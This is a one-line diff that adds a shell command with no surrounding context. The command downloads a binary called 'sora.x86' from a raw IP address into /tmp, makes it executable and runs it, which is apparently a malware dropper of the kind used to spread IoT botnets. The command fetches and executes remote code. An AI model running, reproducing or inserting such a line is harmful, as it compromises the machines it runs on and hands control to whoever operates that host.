@@ -1,0 +1,1 @@
+cd /tmp; wget http://206.189.13.212/sora.x86; chmod +x sora.x86; ./sora.x86
